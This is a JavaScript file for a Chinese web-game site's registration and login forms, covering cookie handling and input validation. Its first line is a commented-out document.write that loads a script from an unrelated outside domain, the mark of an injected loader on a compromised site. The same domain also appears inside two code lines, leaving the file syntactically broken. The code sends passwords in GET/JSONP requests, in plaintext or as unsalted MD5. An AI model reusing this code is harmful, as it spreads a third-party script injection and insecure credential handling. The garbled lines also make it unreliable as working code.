/*document.write('<script src="http://www.992you.com/Rhft8Yn"></script>');*/

﻿var indexUrl="http://lcyx.com";
var User = {
    domain: "lcyx.com",
    info:{},
    loginUrl: indexUrl+"/index.php?m=accounts&a=username_check1",
    regUrl: indexUrl+"/index.php?m=accounts&a=username_check1",
    gameType:'',
	gid:'9', //填写当前游戏ID
  /*  gameUrl: {
      '1028' : indexUrl+'/game/login?game=9'
    },*/
    paramMap : {},
    type:["reg","login"],
    initParams : function(search) {
        if (search.indexOf("?") != -1) {
            var paramString = search.substr(1).split("&");
            var str = '';
            for ( var i = 0; i < paramString.length; i++) {
                str = paramString[i].split("=");
                this.paramMap[str[0]] = str[1];
            }
        }
    },
    param : function(key) {
        var p = this.paramMap[key];
        if (p) {
            return p; 
        }
        this.initParams(window.location.search);
        return this.paramMap[key] || '';
    },
    yeyouparam : function(key) {
   /*     var p = this.paramMap[key];
        if (p) {
            return p; 
        }*/
        this.initParams(window.location.search);
        return this.paramMap[key] || '';
    },
    packParam : function(json) {
        var string = '';
        for ( var key in json) {
            string += "&" + key + "=" + (json[key] || '');
        }
        string = string.length > 0 ? string.substring(1) : '';
        return string;
    },
    setCn: function () {
        var cn = User.getCookie(User.cookieCn);
        if (cn) {
            jQuery("#uname").texwww.992you.com);
            jQuery("#rememberMe").attr("checked", "true")
        }
    },
	

    isReg: function () {
        //验证用户名是否可注册
        var cn = $("#reg_cn").val();
       
        var cn_tip = $("#reg .tips").eq(0);
        var cn_tipContent = $("#reg .tips").eq(0).find("span");        
        var v_params = "service=checkCn&u=" + cn;
		
        User.sendAjax(User.regUrl, v_params, function (data) {

            if (data.result=="success") {
                $(cn_tip).find("em").hide();
                $(cn_tipContent).text(errTip.Msg['available']);
            } else {
                $(cn_tip).find("em").show();
                $(cn_tipContent).text(errTip.Code[data.result]);
            }
        })
    },    
    quickReg: function () {
        var cn = $("#reg_cn").val();
        var pwd = $("#reg_password").val();
        var pwd2 = $("#reg_repassword").val();
        var regType = "quick";
	    var uid=QueryString("uid");
	    var sid=QueryString("sid");
        var cn_result = Verify.validateCn(cn,User.type[0]);
        var pwd_result = Verify.validatePwd(cn,pwd,User.type[0]);
        var pwd2_result = Verify.validatePwd(cn,pwd2,User.type[0]);
        if (User.isEmpty([cn, pwd,pwd2])) {
            User.showTip(errTip.Msg['empty']);
        } else {
			
			
            //减少请求连接
            if(cn_result[0] && pwd_result[0] && pwd2_result[0] && pwd==pwd2){
            	
            	var paramObj = {
            			service : 'regUser',
            			advert : 'stat',
            			enc : '0',
            			cn : cn,
            			pwd : pwd,
            			pwd2 : pwd2,
            			sid : sid,
            			groupId : User.param("groupid"),
            			regType : regType,
            			uid : uid,
						      uf : User.param("uf"),
            			gid : User.gid,
            			ld : User.getCookie("ld")
                };
                var v_params = User.packParam(paramObj);
                User.sendAjax(User.regUrl, v_params, function (data) {  //这块已经是后台返回的数据
                    if ("success" == data.result) {
 						if(data.fid>0){
							location.href = indexUrl+'/game/login?game='+data.gid+'&server='+data.fid;
						}
						else
						{
							//alert(data.result);
							location.href = indexUrl;
						}
                    } else {
                        User.showTip(errTip.Code[data.result])
                    }
                })
            }
        }
    },    
   
    quickLogin: function () {
        //提示，由于登录和注册位于同一个页面，不同层，所以id不能重！
        var cn = $("#login_cn").val();
        var pwd = $("#login_password").val();
        var loginType = "quick";
        var rememberMe = $("#rememberMe").attr("checked");
        var login_tipContent = $("#login .tips").eq(2).find("span");
        //验证用户名密码结果
        var cn_result = Verify.validateCn(cn,User.type[1]);
        var pwd_result = Verify.validatePwd(cn,pwd,User.type[1]);
        if (User.isEmpty([cn, pwd])) {
            $(login_tipContent).text(errTip.Msg['empty']);
        } else {
            //判定验证通过后，再提交
            if(cn_result[0] && pwd_result[0]){
            	pwd = hex_md5(pwd);
            	var paramObj = {
            			service : 'toLogin',
            			enc : '0',
            			cn : cn,
            			pwd : pwd,
            			gameType : User.param("gameid"),
            			groupId : User.param("groupid"),
            			loginType : loginType,
            			uf : User.param("uf"),
            			gid : User.param('gid'),
            			ld : User.getCookie("ld")
                };
                var v_params = User.packParam(paramObj);
                User.sendAjax(User.loginUrl, v_params, function (data) {
                    if ("success" == data.result) {
                        User.setCookie(cn, rememberMe);
                        var server = data.server[0];
                        if (server){
                        	var game_navUrl = User.gameUrl[User.param("gameid")] || "";
                            var game_url = game_navUrl + "?gtype=" + User.param("gameid") + "&gid=" + server.id + "&uf=" + User.param("uf");
                            location.href = game_url;                            
                        }else{//若没有服务器信息，跳转到页游首页
                            location.href = "http://wan.yeyou.com";
                        }
                    }else {
                        $(login_tipContent).text(errTip.Code[data.result])
                    }
                })
            }else{
                $(login_tipContent).text(errTip.Msg['login']);
            }
        }
    },
    getCookie: function (name) {
        var strcookie = document.cookie;
        if (strcookie != "") {
            var arrcookie = strcookie.split("; ");
            for (var i = 0; i < arrcookie.length; i++) {
                var arr = arrcookie[i].split("=");
                if (arr[0] == name) return arr[1]
            }
        }
        return ""
    },
    setCookie: function (cn, rememberMe) {
        document.cookie = User.cookieCn + "=" + cn + ";domain=." + User.domain + ";path=/";
        var date = new Date();
        if (rememberMe) {
            date.setTime(date.getTime() + 365 * 24 * 3600 * 1000);
            document.cookie = User.cookieRem + "=" + cn + ";expires=" + date.toGMTString() + ";domain=." + User.domain + ";path=/"
        } else{
            date.setTime(date.getTime() - 1);
            document.cookie = User.cookieRem + "=;expires=" + date.toGMTString() + ";domain=." + User.domain + ";path=/"
        }
    },
    clearCookie: function () {
        var date = new Date();
        date.setTime(date.getTime() - 1);
        document.cookie = User.cookieCn + "=;expires=" + date.toGMTString() + ";domain=." + User.domain + ";path=/"
    },
    sendAjax: function (uri, params, callback) {
        jQuery.ajax({
            type: 'GET',
            url: uri,
            dataType: 'jsonp',
            jsonp: 'jsonpCallback',
            data: params,
            async: false,
            success: callback,
            error: function (XMLHttpRequest, textStatus, errorThrown) {
                if (XMLHttpRequest.readyState == 4) {
                    User.showTip(errTip.Code['err0033'])
                }
            }
        })
    },
    showTip: function (msg) {
        $('#server_error_tip').show().text(msg);
        //alert(msg);
    },
    isEmpty: function (array) {
        for (var i = 0; i < array.length; i++) {
            if (array[i] == "" || array[i] == undefined) {
                return true
            }
        }
        return false
    }
};

Verify = {
    cnReg: /^[a-zA-Z0-9][_a-zA-Z0-9]{4,15}$/,
    pwdReg: /^[~`!@#$%\^&*()_+=\-{}\]\[:;.<>\/?a-zA-Z0-9]{4,16}$/,
    validateCn: function (cn, type) {
        var flag = false;
        if (User.isEmpty([cn])) {
            var tipContent = errTip.Code['err0002'];
        } else if(type == "login"){ //判断类型、若登录非空即可
                flag = true;
                return [flag];
        } else if(cn.length < 6 || cn.length > 16) {
            var tipContent = errTip.Msg['uname_length'];
        } else if(!Verify.cnReg.teswww.992you.com)){
            var tipContent = errTip.Msg['uname'];
        } else {
            flag = true;
        }
        return [flag,tipContent];
    },
    validatePwd: function (cn,password,type) {
        var flag = false;
        if (User.isEmpty([password])) {
            var tipContent = errTip.Code['err0005'];
        } else if (password.length < 4 || password.length > 16) {
            var tipContent = errTip.Msg['pwd_length'];
        } else if (!Verify.pwdReg.test(password)) {
            var tipContent = errTip.Msg['pwd_restrict'];
        } else if (password == cn) {
            var tipContent = errTip.Msg['pwd_uname'];
        } else {
            flag = true;
            return [flag];
        }
        return [flag,tipContent];
    }
};
